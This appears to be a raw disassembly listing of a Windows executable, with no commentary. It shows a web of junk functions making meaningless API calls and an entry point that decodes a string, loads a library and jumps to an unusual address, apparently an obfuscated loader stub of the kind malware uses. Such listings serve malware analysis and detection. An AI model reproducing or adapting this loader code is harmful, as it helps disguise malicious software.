0x004d0000:	movl	%edi, %edi	; from: 0x004d0a12(MAY)
0x004d0002:	pushl	%ebp
0x004d0003:	movl	%esp, %ebp
0x004d0005:	subl	$0x20, %esp
0x004d0008:	leal	0x004d3018, %ebx
0x004d000e:	andl	$0x25ab, -28(%ebp)
0x004d0015:	pushl	$0x0
0x004d0017:	call	SetLastError@kernel32.dll	; targets: 0xff000250(MAY)
0x004d001d:	pushl	%ebx
0x004d001e:	pushl	0x14c(%ebx)
0x004d0024:	pushl	0x1ac(%ebx)
0x004d002a:	pushl	%ecx
0x004d002b:	pushl	%esi
0x004d002c:	call	0x004d06e0	; targets: 0x004d06e0(MAY)
0x004d0044:	movl	%edi, %edi	; from: 0x004d00f9(MAY)
0x004d0046:	pushl	%ebp
0x004d0047:	movl	%esp, %ebp
0x004d0049:	subl	$0x24, %esp
0x004d004c:	leal	0x004d31f8, %esi
0x004d0052:	andl	$0x41, -28(%ebp)
0x004d0056:	pushl	%esi
0x004d0057:	pushl	%ecx
0x004d0058:	pushl	%ecx
0x004d0059:	pushl	0x98(%esi)
0x004d005f:	pushl	0x1c(%esi)
0x004d0062:	call	0x004d0398	; targets: 0x004d0398(MAY)
0x004d008c:	movl	%edi, %edi	; from: 0x004d0a91(MAY)
0x004d008e:	pushl	%ebp
0x004d008f:	movl	%esp, %ebp
0x004d0091:	subl	$0x24, %esp
0x004d0094:	leal	0x88(%edx), %esi
0x004d009a:	subl	%ecx, -168(%esi)
0x004d00a0:	pushl	%esi
0x004d00a1:	pushl	0x88(%esi)
0x004d00a7:	pushl	0x104(%esi)
0x004d00ad:	pushl	0xf4(%esi)
0x004d00b3:	pushl	%ebx
0x004d00b4:	call	0x004d03ec	; targets: 0x004d03ec(MAY)
0x004d00d8:	movl	%edi, %edi	; from: 0x004d0525(MAY)
0x004d00da:	pushl	%ebp
0x004d00db:	movl	%esp, %ebp
0x004d00dd:	subl	$0x1c, %esp
0x004d00e0:	leal	0x004d31d4, %ecx
0x004d00e6:	xorl	$0xc3a, %edx
0x004d00ec:	pushl	%ecx
0x004d00ed:	pushl	0x194(%ecx)
0x004d00f3:	pushl	0x1c0(%ecx)
0x004d00f9:	call	0x004d0044	; targets: 0x004d0044(MAY)
0x004d0124:	movl	%edi, %edi	; from: 0x004d079f(MAY)
0x004d0126:	pushl	%ebp
0x004d0127:	movl	%esp, %ebp
0x004d0129:	subl	$0x44, %esp
0x004d012c:	addl	-16(%ebp), %ecx
0x004d012f:	leal	0x004d30f4, %esi
0x004d0135:	pushl	$0x6ac
0x004d013a:	pushl	$0x6ac
0x004d013f:	pushl	$0x40001
0x004d0144:	movl	$0x8629859a, %eax
0x004d0149:	pushl	0x7a239a86(%eax)
0x004d014f:	subl	$0x2, (%esp)
0x004d0153:	movl	$0x4d2008, %eax
0x004d0158:	popl	(%eax)
0x004d015a:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff0001ae(MAY)
0x004d01b8:	movl	%edi, %edi	; from: 0x004d02f6(MAY)
0x004d01ba:	pushl	%ebp
0x004d01bb:	movl	%esp, %ebp
0x004d01bd:	subl	$0x30, %esp
0x004d01c0:	movl	$0x4d31f4, %eax
0x004d01c5:	sbbl	%edx, -412(%eax)
0x004d01cb:	pushl	%eax
0x004d01cc:	pushl	%edx
0x004d01cd:	pushl	0x4c(%eax)
0x004d01d0:	call	0x004d08d0	; targets: 0x004d08d0(MAY)
0x004d0200:	movl	%edi, %edi	; from: 0x004d0269(MAY)
0x004d0202:	pushl	%ebp
0x004d0203:	movl	%esp, %ebp
0x004d0205:	subl	$0x2c, %esp
0x004d0208:	movl	$0x4d3040, %ecx
0x004d020d:	subl	%ecx, %eax
0x004d020f:	pushl	%ecx
0x004d0210:	pushl	0x2c(%ecx)
0x004d0213:	pushl	%edi
0x004d0214:	call	0x004d0650	; targets: 0x004d0650(MAY)
0x004d0240:	movl	%edi, %edi	; from: 0x004d0446(MAY)
0x004d0242:	pushl	%ebp
0x004d0243:	movl	%esp, %ebp
0x004d0245:	subl	$0x50, %esp
0x004d0248:	movl	$0x4d3130, %ebx
0x004d024d:	movl	%ebx, -24(%ebp)
0x004d0250:	movl	$0x0, %edi
0x004d0255:	pushl	%edi
0x004d0256:	call	HeapDestroy@kernel32.dll	; targets: 0xff000270(MAY)
0x004d025c:	pushl	%ebx
0x004d025d:	pushl	0x5c(%ebx)
0x004d0260:	pushl	0x1a4(%ebx)
0x004d0266:	pushl	0x38(%ebx)
0x004d0269:	call	0x004d0200	; targets: 0x004d0200(MAY)
0x004d0284:	movl	%edi, %edi	; from: 0x004d09c1(MAY)
0x004d0286:	pushl	%ebp
0x004d0287:	movl	%esp, %ebp
0x004d0289:	subl	$0x3c, %esp
0x004d028c:	leal	0x004d3128, %eax
0x004d0292:	andl	-40(%ebp), %esi
0x004d0295:	pushl	%eax
0x004d0296:	pushl	$0x0
0x004d0298:	call	FindClose@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d029e:	popl	%eax
0x004d029f:	pushl	%eax
0x004d02a0:	pushl	0x1fc(%eax)
0x004d02a6:	pushl	0x80(%eax)
0x004d02ac:	pushl	0x110(%eax)
0x004d02b2:	pushl	%edi
0x004d02b3:	call	0x004d0b34	; targets: 0x004d0b34(MAY)
0x004d02d0:	movl	%edi, %edi	; from: 0x004d0c9b(MAY)
0x004d02d2:	pushl	%ebp
0x004d02d3:	movl	%esp, %ebp
0x004d02d5:	subl	$0x44, %esp
0x004d02d8:	leal	0xc0(%edi), %ebx
0x004d02de:	movl	$0xffffd627, -104(%ebx)
0x004d02e5:	pushl	%ebx
0x004d02e6:	pushl	0x4c(%ebx)
0x004d02e9:	pushl	0xa8(%ebx)
0x004d02ef:	pushl	%ecx
0x004d02f0:	pushl	0x1a8(%ebx)
0x004d02f6:	call	0x004d01b8	; targets: 0x004d01b8(MAY)
0x004d0318:	movl	%edi, %edi	; from: 0x004d0370(MAY)
0x004d031a:	pushl	%ebp
0x004d031b:	movl	%esp, %ebp
0x004d031d:	subl	$0x2c, %esp
0x004d0320:	leal	0x004d3004, %edx
0x004d0326:	subl	%esi, -28(%ebp)
0x004d0329:	pushl	%edx
0x004d032a:	call	GetFocus@user32.dll	; targets: 0xff000040(MAY)
0x004d0330:	popl	%edx
0x004d0331:	pushl	%edx
0x004d0332:	pushl	%ebx
0x004d0333:	pushl	%esi
0x004d0334:	pushl	%eax
0x004d0335:	call	0x004d07bc	; targets: 0x004d07bc(MAY)
0x004d0358:	movl	%edi, %edi	; from: 0x004d082e(MAY)
0x004d035a:	pushl	%ebp
0x004d035b:	movl	%esp, %ebp
0x004d035d:	subl	$0x38, %esp
0x004d0360:	movl	$0x4d307c, %eax
0x004d0365:	subl	%esi, -40(%ebp)
0x004d0368:	pushl	%eax
0x004d0369:	pushl	%edi
0x004d036a:	pushl	0x1a8(%eax)
0x004d0370:	call	0x004d0318	; targets: 0x004d0318(MAY)
0x004d0398:	movl	%edi, %edi	; from: 0x004d0062(MAY)
0x004d039a:	pushl	%ebp
0x004d039b:	movl	%esp, %ebp
0x004d039d:	subl	$0x30, %esp
0x004d03a0:	leal	0x004d30c0, %eax
0x004d03a6:	movl	%ebx, -148(%eax)
0x004d03ac:	pushl	%eax
0x004d03ad:	pushl	$0x0
0x004d03af:	call	TlsGetValue@kernel32.dll	; targets: 0xff000030(MAY)
0x004d03b5:	popl	%eax
0x004d03b6:	pushl	%eax
0x004d03b7:	pushl	0x94(%eax)
0x004d03bd:	pushl	0xb8(%eax)
0x004d03c3:	call	0x004d0af8	; targets: 0x004d0af8(MAY)
0x004d03ec:	movl	%edi, %edi	; from: 0x004d00b4(MAY)
0x004d03ee:	pushl	%ebp
0x004d03ef:	movl	%esp, %ebp
0x004d03f1:	subl	$0x38, %esp
0x004d03f4:	leal	-344(%esi), %edi
0x004d03fa:	orl	0x90(%edi), %ecx
0x004d0400:	movl	$0x0, %esi
0x004d0405:	pushl	%esi
0x004d0406:	call	HeapDestroy@kernel32.dll	; targets: 0xff000270(MAY)
0x004d040c:	pushl	%edi
0x004d040d:	pushl	%esi
0x004d040e:	pushl	%eax
0x004d040f:	call	0x004d0604	; targets: 0x004d0604(MAY)
0x004d0434:	movl	%edi, %edi	; from: 0x004d0bce(MAY)
0x004d0436:	pushl	%ebp
0x004d0437:	movl	%esp, %ebp
0x004d0439:	subl	$0x44, %esp
0x004d043c:	movl	$0x4d30e8, %eax
0x004d0441:	sbbl	%eax, %esi
0x004d0443:	pushl	%eax
0x004d0444:	pushl	%esi
0x004d0445:	pushl	%ebx
0x004d0446:	call	0x004d0240	; targets: 0x004d0240(MAY)
0x004d0474:	movl	%edi, %edi	; from: 0x004d0c11(MAY)
0x004d0476:	pushl	%ebp
0x004d0477:	movl	%esp, %ebp
0x004d0479:	subl	$0x4c, %esp
0x004d047c:	leal	0x004d3068, %eax
0x004d0482:	subl	%eax, -72(%ebp)
0x004d0485:	pushl	%eax
0x004d0486:	pushl	%ecx
0x004d0487:	pushl	%edx
0x004d0488:	pushl	%edi
0x004d0489:	call	0x004d0b70	; targets: 0x004d0b70(MAY)
0x004d04ac:	movl	%edi, %edi	; from: 0x004d0564(MAY)
0x004d04ae:	pushl	%ebp
0x004d04af:	movl	%esp, %ebp
0x004d04b1:	subl	$0x34, %esp
0x004d04b4:	leal	0x004d3194, %edi
0x004d04ba:	subl	%ebx, -12(%ebp)
0x004d04bd:	pushl	%edi
0x004d04be:	pushl	%eax
0x004d04bf:	pushl	0x34(%edi)
0x004d04c2:	pushl	0x194(%edi)
0x004d04c8:	pushl	0x88(%edi)
0x004d04ce:	call	0x004d0a28	; targets: 0x004d0a28(MAY)

start:
0x004d04ec:	pushl	$0x0
0x004d04ee:	call	SetLastError@kernel32.dll	; targets: 0xff000250(MAY)
0x004d04f4:	pushl	$0x0
0x004d04f6:	call	Sleep@kernel32.dll	; targets: 0xff000130(MAY)
0x004d04fc:	pushl	$0x2
0x004d04fe:	xorl	%eax, %eax
0x004d0500:	leal	0x4d3200(,%eax,2), %eax
0x004d0507:	pushl	$0x0
0x004d0509:	leal	0xc(%eax), %ecx
0x004d050c:	addb	$0xffffffb0, (%ecx)
0x004d050f:	pushl	%eax
0x004d0510:	nop	
0x004d0511:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0517:	leal	0x3b(%eax), %edx
0x004d051a:	movl	(%edx), %ecx
0x004d051c:	movl	0x28(%eax,%ecx), %eax
0x004d0520:	movb	$0x40, %ah
0x004d0522:	pusha	
0x004d0523:	cmpb	%ah, %al
0x004d0525:	ja	0x004d00d8	; targets: 0x004d052b(MAY), 0x004d00d8(MAY)
0x004d052b:	popa		; from: 0x004d0525(MAY)
0x004d052c:	ret	; targets: 0xfee70000(MAY)

0x004d0538:	movl	%edi, %edi	; from: 0x004d0c50(MAY)
0x004d053a:	pushl	%ebp
0x004d053b:	movl	%esp, %ebp
0x004d053d:	subl	$0x4c, %esp
0x004d0540:	leal	-356(%eax), %ecx
0x004d0546:	orl	%eax, 0x28(%ecx)
0x004d0549:	pushl	%ecx
0x004d054a:	movl	$0x0, %ebx
0x004d054f:	pushl	%ebx
0x004d0550:	call	Sleep@kernel32.dll	; targets: 0xff000130(MAY)
0x004d0556:	popl	%ecx
0x004d0557:	pushl	%ecx
0x004d0558:	pushl	0x44(%ecx)
0x004d055b:	pushl	%ebx
0x004d055c:	pushl	0x168(%ecx)
0x004d0562:	pushl	(%ecx)
0x004d0564:	call	0x004d04ac	; targets: 0x004d04ac(MAY)
0x004d0580:	movl	%edi, %edi	; from: 0x004d0b8a(MAY)
0x004d0582:	pushl	%ebp
0x004d0583:	movl	%esp, %ebp
0x004d0585:	subl	$0x24, %esp
0x004d0588:	movl	$0x4d3148, %edi
0x004d058d:	adcl	%edi, -28(%ebp)
0x004d0590:	pushl	%edi
0x004d0591:	pushl	%eax
0x004d0592:	pushl	%ecx
0x004d0593:	pushl	0x168(%edi)
0x004d0599:	pushl	%ebx
0x004d059a:	call	0x004d09e8	; targets: 0x004d09e8(MAY)
0x004d05c4:	movl	%edi, %edi	; from: 0x004d0941(MAY)
0x004d05c6:	pushl	%ebp
0x004d05c7:	movl	%esp, %ebp
0x004d05c9:	subl	$0x50, %esp
0x004d05cc:	movl	$0x4d31cc, %esi
0x004d05d1:	addl	%edi, -20(%ebp)
0x004d05d4:	pushl	$0x0
0x004d05d6:	call	TlsGetValue@kernel32.dll	; targets: 0xff000030(MAY)
0x004d05dc:	pushl	%esi
0x004d05dd:	pushl	%edi
0x004d05de:	pushl	0x44(%esi)
0x004d05e1:	pushl	0x98(%esi)
0x004d05e7:	call	0x004d072c	; targets: 0x004d072c(MAY)
0x004d0604:	movl	%edi, %edi	; from: 0x004d040f(MAY)
0x004d0606:	pushl	%ebp
0x004d0607:	movl	%esp, %ebp
0x004d0609:	subl	$0x20, %esp
0x004d060c:	leal	0x004d3164, %ebx
0x004d0612:	sbbl	%esi, -348(%ebx)
0x004d0618:	pushl	%ebx
0x004d0619:	pushl	%edi
0x004d061a:	pushl	%edi
0x004d061b:	pushl	0x1d0(%ebx)
0x004d0621:	pushl	0x198(%ebx)
0x004d0627:	call	0x004d0844	; targets: 0x004d0844(MAY)
0x004d0650:	movl	%edi, %edi	; from: 0x004d0214(MAY)
0x004d0652:	pushl	%ebp
0x004d0653:	movl	%esp, %ebp
0x004d0655:	subl	$0x2c, %esp
0x004d0658:	leal	0x004d3054, %edx
0x004d065e:	sbbl	%eax, -40(%ebp)
0x004d0661:	pushl	%edx
0x004d0662:	pushl	0x170(%edx)
0x004d0668:	pushl	%ebx
0x004d0669:	pushl	0x58(%edx)
0x004d066c:	pushl	0xe0(%edx)
0x004d0672:	call	0x004d0bf8	; targets: 0x004d0bf8(MAY)
0x004d06a0:	movl	%edi, %edi	; from: 0x004d0863(MAY)
0x004d06a2:	pushl	%ebp
0x004d06a3:	movl	%esp, %ebp
0x004d06a5:	subl	$0x54, %esp
0x004d06a8:	leal	0x004d31fc, %ebx
0x004d06ae:	addl	-64(%ebp), %ecx
0x004d06b1:	pushl	%ebx
0x004d06b2:	pushl	0x68(%ebx)
0x004d06b5:	pushl	0x13c(%ebx)
0x004d06bb:	pushl	0x10(%ebx)
0x004d06be:	pushl	%ecx
0x004d06bf:	call	0x004d0888	; targets: 0x004d0888(MAY)
0x004d06e0:	movl	%edi, %edi	; from: 0x004d002c(MAY)
0x004d06e2:	pushl	%ebp
0x004d06e3:	movl	%esp, %ebp
0x004d06e5:	subl	$0x60, %esp
0x004d06e8:	movl	$0x4d3138, %eax
0x004d06ed:	addl	$0xffffecfc, %edx
0x004d06f3:	pushl	%eax
0x004d06f4:	movl	$0x0, %edi
0x004d06f9:	pushl	%edi
0x004d06fa:	call	GlobalFree@kernel32.dll	; targets: 0xff000200(MAY)
0x004d0700:	popl	%eax
0x004d0701:	pushl	%eax
0x004d0702:	pushl	0x12c(%eax)
0x004d0708:	pushl	0xb4(%eax)
0x004d070e:	call	0x004d0924	; targets: 0x004d0924(MAY)
0x004d072c:	movl	%edi, %edi	; from: 0x004d05e7(MAY)
0x004d072e:	pushl	%ebp
0x004d072f:	movl	%esp, %ebp
0x004d0731:	subl	$0x5c, %esp
0x004d0734:	leal	-100(%esi), %edi
0x004d0737:	cmpl	$0x2fd0, %edi
0x004d073d:	jbe	0x004d072f	; targets: 0x004d073f(MAY)
0x004d073f:	movl	$0x0, %ecx	; from: 0x004d073d(MAY)
0x004d0744:	pushl	%ecx
0x004d0745:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000180(MAY)
0x004d074b:	pushl	%edi
0x004d074c:	pushl	0x54(%edi)
0x004d074f:	pushl	0x38(%edi)
0x004d0752:	pushl	0x194(%edi)
0x004d0758:	pushl	0x108(%edi)
0x004d075e:	call	0x004d0ab4	; targets: 0x004d0ab4(MAY)
0x004d0778:	movl	%edi, %edi	; from: 0x004d08ac(MAY)
0x004d077a:	pushl	%ebp
0x004d077b:	movl	%esp, %ebp
0x004d077d:	subl	$0x30, %esp
0x004d0780:	movl	$0x4d3168, %ebx
0x004d0785:	addl	%ecx, -228(%ebx)
0x004d078b:	movl	$0x0, %esi
0x004d0790:	pushl	%esi
0x004d0791:	call	IsWindow@user32.dll	; targets: 0xff000170(MAY)
0x004d0797:	pushl	%ebx
0x004d0798:	pushl	%edx
0x004d0799:	pushl	0x14(%ebx)
0x004d079c:	pushl	0x48(%ebx)
0x004d079f:	call	0x004d0124	; targets: 0x004d0124(MAY)
0x004d07bc:	movl	%edi, %edi	; from: 0x004d0335(MAY)
0x004d07be:	pushl	%ebp
0x004d07bf:	movl	%esp, %ebp
0x004d07c1:	subl	$0x48, %esp
0x004d07c4:	movl	$0x4d31fc, %esi
0x004d07c9:	orl	%edi, -16(%ebp)
0x004d07cc:	movl	$0x0, %edi
0x004d07d1:	pushl	%edi
0x004d07d2:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d07d8:	pushl	%esi
0x004d07d9:	pushl	0x188(%esi)
0x004d07df:	pushl	0x114(%esi)
0x004d07e5:	pushl	%eax
0x004d07e6:	call	0x004d096c	; targets: 0x004d096c(MAY)
0x004d0800:	movl	%edi, %edi	; from: 0x004d0ade(MAY)
0x004d0802:	pushl	%ebp
0x004d0803:	movl	%esp, %ebp
0x004d0805:	subl	$0x3c, %esp
0x004d0808:	leal	0x8(%edx), %edi
0x004d080b:	cmpl	$0x86d, %edi
0x004d0811:	jbe	0x004d0803	; targets: 0x004d0813(MAY)
0x004d0813:	movl	$0x0, %ecx	; from: 0x004d0811(MAY)
0x004d0818:	pushl	%ecx
0x004d0819:	call	LocalUnlock@kernel32.dll	; targets: 0xff000160(MAY)
0x004d081f:	pushl	%edi
0x004d0820:	pushl	0x130(%edi)
0x004d0826:	pushl	%esi
0x004d0827:	pushl	0xe8(%edi)
0x004d082d:	pushl	%ecx
0x004d082e:	call	0x004d0358	; targets: 0x004d0358(MAY)
0x004d0844:	movl	%edi, %edi	; from: 0x004d0627(MAY)
0x004d0846:	pushl	%ebp
0x004d0847:	movl	%esp, %ebp
0x004d0849:	subl	$0x3c, %esp
0x004d084c:	movl	$0x4d3090, %ecx
0x004d0851:	sbbl	$0x37, -60(%ebp)
0x004d0855:	pushl	%ecx
0x004d0856:	pushl	%ebx
0x004d0857:	pushl	0x140(%ecx)
0x004d085d:	pushl	0x14c(%ecx)
0x004d0863:	call	0x004d06a0	; targets: 0x004d06a0(MAY)
0x004d0888:	movl	%edi, %edi	; from: 0x004d06bf(MAY)
0x004d088a:	pushl	%ebp
0x004d088b:	movl	%esp, %ebp
0x004d088d:	subl	$0x2c, %esp
0x004d0890:	leal	-464(%ebx), %esi
0x004d0896:	cmpl	$0x214a, %esi
0x004d089c:	je	0x004d088b	; targets: 0x004d089e(MAY)
0x004d089e:	pushl	%esi	; from: 0x004d089c(MAY)
0x004d089f:	pushl	%edx
0x004d08a0:	pushl	0x1fc(%esi)
0x004d08a6:	pushl	0x16c(%esi)
0x004d08ac:	call	0x004d0778	; targets: 0x004d0778(MAY)
0x004d08d0:	movl	%edi, %edi	; from: 0x004d01d0(MAY)
0x004d08d2:	pushl	%ebp
0x004d08d3:	movl	%esp, %ebp
0x004d08d5:	subl	$0x28, %esp
0x004d08d8:	leal	0x004d31fc, %ecx
0x004d08de:	andl	$0x52, -432(%ecx)
0x004d08e5:	pushl	%ecx
0x004d08e6:	pushl	$0x0
0x004d08e8:	call	GetDC@user32.dll	; targets: 0xff000090(MAY)
0x004d08ee:	popl	%ecx
0x004d08ef:	pushl	%ecx
0x004d08f0:	pushl	%ebx
0x004d08f1:	pushl	0xdc(%ecx)
0x004d08f7:	call	0x004d09ac	; targets: 0x004d09ac(MAY)
0x004d0924:	movl	%edi, %edi	; from: 0x004d070e(MAY)
0x004d0926:	pushl	%ebp
0x004d0927:	movl	%esp, %ebp
0x004d0929:	subl	$0x48, %esp
0x004d092c:	movl	$0x4d3064, %edi
0x004d0931:	sbbl	-8(%ebp), %edx
0x004d0934:	pushl	%edi
0x004d0935:	pushl	0x14c(%edi)
0x004d093b:	pushl	0xf4(%edi)
0x004d0941:	call	0x004d05c4	; targets: 0x004d05c4(MAY)
0x004d096c:	movl	%edi, %edi	; from: 0x004d07e6(MAY)
0x004d096e:	pushl	%ebp
0x004d096f:	movl	%esp, %ebp
0x004d0971:	subl	$0x30, %esp
0x004d0974:	leal	0x004d30d8, %edx
0x004d097a:	sbbl	$0x5955, -20(%edx)
0x004d0981:	pushl	%edx
0x004d0982:	pushl	0x28(%edx)
0x004d0985:	pushl	%eax
0x004d0986:	pushl	0x10(%edx)
0x004d0989:	call	0x004d0c74	; targets: 0x004d0c74(MAY)
0x004d09ac:	movl	%edi, %edi	; from: 0x004d08f7(MAY)
0x004d09ae:	pushl	%ebp
0x004d09af:	movl	%esp, %ebp
0x004d09b1:	subl	$0x24, %esp
0x004d09b4:	leal	-76(%ecx), %ebx
0x004d09b7:	adcl	%edx, %ecx
0x004d09b9:	pushl	%ebx
0x004d09ba:	pushl	%edx
0x004d09bb:	pushl	0x13c(%ebx)
0x004d09c1:	call	0x004d0284	; targets: 0x004d0284(MAY)
0x004d09e8:	movl	%edi, %edi	; from: 0x004d059a(MAY)
0x004d09ea:	pushl	%ebp
0x004d09eb:	movl	%esp, %ebp
0x004d09ed:	subl	$0x44, %esp
0x004d09f0:	leal	0x004d307c, %esi
0x004d09f6:	cmpl	$0x578d, %esi
0x004d09fc:	je	0x004d09eb	; targets: 0x004d09fe(MAY)
0x004d09fe:	pushl	$0x0	; from: 0x004d09fc(MAY)
0x004d0a00:	call	HeapDestroy@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0a06:	pushl	%esi
0x004d0a07:	pushl	0x108(%esi)
0x004d0a0d:	pushl	%edi
0x004d0a0e:	pushl	%edx
0x004d0a0f:	pushl	0x10(%esi)
0x004d0a12:	call	0x004d0000	; targets: 0x004d0000(MAY)
0x004d0a28:	movl	%edi, %edi	; from: 0x004d04ce(MAY)
0x004d0a2a:	pushl	%ebp
0x004d0a2b:	movl	%esp, %ebp
0x004d0a2d:	subl	$0x58, %esp
0x004d0a30:	movl	$0x4d3150, %ecx
0x004d0a35:	subl	%ebx, -40(%ecx)
0x004d0a38:	pushl	%ecx
0x004d0a39:	pushl	%esi
0x004d0a3a:	pushl	%edx
0x004d0a3b:	pushl	0x160(%ecx)
0x004d0a41:	pushl	%edx
0x004d0a42:	call	0x004d0bac	; targets: 0x004d0bac(MAY)
0x004d0a74:	movl	%edi, %edi	; from: 0x004d0b4f(MAY)
0x004d0a76:	pushl	%ebp
0x004d0a77:	movl	%esp, %ebp
0x004d0a79:	subl	$0x5c, %esp
0x004d0a7c:	movl	$0x4d3120, %edx
0x004d0a81:	andl	-72(%ebp), %eax
0x004d0a84:	pushl	%edx
0x004d0a85:	call	GetLastError@kernel32.dll	; targets: 0xff000050(MAY)
0x004d0a8b:	popl	%edx
0x004d0a8c:	pushl	%edx
0x004d0a8d:	pushl	%edi
0x004d0a8e:	pushl	0x60(%edx)
0x004d0a91:	call	0x004d008c	; targets: 0x004d008c(MAY)
0x004d0ab4:	movl	%edi, %edi	; from: 0x004d075e(MAY)
0x004d0ab6:	pushl	%ebp
0x004d0ab7:	movl	%esp, %ebp
0x004d0ab9:	subl	$0x58, %esp
0x004d0abc:	movl	$0x4d3064, %edx
0x004d0ac1:	xorl	$0xffffb5f1, 0xa0(%edx)
0x004d0acb:	pushl	%edx
0x004d0acc:	pushl	$0x0
0x004d0ace:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000180(MAY)
0x004d0ad4:	popl	%edx
0x004d0ad5:	pushl	%edx
0x004d0ad6:	pushl	%ebx
0x004d0ad7:	pushl	0x94(%edx)
0x004d0add:	pushl	%esi
0x004d0ade:	call	0x004d0800	; targets: 0x004d0800(MAY)
0x004d0af8:	movl	%edi, %edi	; from: 0x004d03c3(MAY)
0x004d0afa:	pushl	%ebp
0x004d0afb:	movl	%esp, %ebp
0x004d0afd:	subl	$0x34, %esp
0x004d0b00:	leal	0x004d319c, %edi
0x004d0b06:	subl	-40(%ebp), %ecx
0x004d0b09:	pushl	%edi
0x004d0b0a:	pushl	%eax
0x004d0b0b:	pushl	%eax
0x004d0b0c:	call	0x004d0c38	; targets: 0x004d0c38(MAY)
0x004d0b34:	movl	%edi, %edi	; from: 0x004d02b3(MAY)
0x004d0b36:	pushl	%ebp
0x004d0b37:	movl	%esp, %ebp
0x004d0b39:	subl	$0x3c, %esp
0x004d0b3c:	leal	0x004d310c, %esi
0x004d0b42:	addl	$0xffffffb2, %ebx
0x004d0b45:	pushl	%esi
0x004d0b46:	pushl	%ecx
0x004d0b47:	pushl	%ebx
0x004d0b48:	pushl	0x174(%esi)
0x004d0b4e:	pushl	%edi
0x004d0b4f:	call	0x004d0a74	; targets: 0x004d0a74(MAY)
0x004d0b70:	movl	%edi, %edi	; from: 0x004d0489(MAY)
0x004d0b72:	pushl	%ebp
0x004d0b73:	movl	%esp, %ebp
0x004d0b75:	subl	$0x20, %esp
0x004d0b78:	leal	0x004d30ac, %esi
0x004d0b7e:	adcl	$0x3f, 0x24(%esi)
0x004d0b82:	pushl	%esi
0x004d0b83:	pushl	%edi
0x004d0b84:	pushl	0x4c(%esi)
0x004d0b87:	pushl	0x50(%esi)
0x004d0b8a:	call	0x004d0580	; targets: 0x004d0580(MAY)
0x004d0bac:	movl	%edi, %edi	; from: 0x004d0a42(MAY)
0x004d0bae:	pushl	%ebp
0x004d0baf:	movl	%esp, %ebp
0x004d0bb1:	subl	$0x1c, %esp
0x004d0bb4:	leal	-32(%ecx), %ebx
0x004d0bb7:	xorl	$0x5e9b, -8(%ebp)
0x004d0bbe:	pushl	%ebx
0x004d0bbf:	pushl	0x134(%ebx)
0x004d0bc5:	pushl	0xd8(%ebx)
0x004d0bcb:	pushl	0x3c(%ebx)
0x004d0bce:	call	0x004d0434	; targets: 0x004d0434(MAY)
0x004d0bf8:	movl	%edi, %edi	; from: 0x004d0672(MAY)
0x004d0bfa:	pushl	%ebp
0x004d0bfb:	movl	%esp, %ebp
0x004d0bfd:	subl	$0x5c, %esp
0x004d0c00:	leal	0x004d31e4, %ebx
0x004d0c06:	addl	$0xffffffea, %edi
0x004d0c09:	pushl	%ebx
0x004d0c0a:	pushl	%edx
0x004d0c0b:	pushl	0xfc(%ebx)
0x004d0c11:	call	0x004d0474	; targets: 0x004d0474(MAY)
0x004d0c38:	movl	%edi, %edi	; from: 0x004d0b0c(MAY)
0x004d0c3a:	pushl	%ebp
0x004d0c3b:	movl	%esp, %ebp
0x004d0c3d:	subl	$0x54, %esp
0x004d0c40:	movl	$0x4d31f4, %eax
0x004d0c45:	orl	%eax, -68(%ebp)
0x004d0c48:	pushl	%eax
0x004d0c49:	pushl	%edi
0x004d0c4a:	pushl	0x100(%eax)
0x004d0c50:	call	0x004d0538	; targets: 0x004d0538(MAY)
0x004d0c74:	movl	%edi, %edi	; from: 0x004d0989(MAY)
0x004d0c76:	pushl	%ebp
0x004d0c77:	movl	%esp, %ebp
0x004d0c79:	subl	$0x58, %esp
0x004d0c7c:	movl	$0x4d30b0, %edi
0x004d0c81:	andl	$0xffffff9a, 0xa8(%edi)
0x004d0c88:	pushl	%edi
0x004d0c89:	pushl	0x148(%edi)
0x004d0c8f:	pushl	0xd0(%edi)
0x004d0c95:	pushl	0x1d8(%edi)
0x004d0c9b:	call	0x004d02d0	; targets: 0x004d02d0(MAY)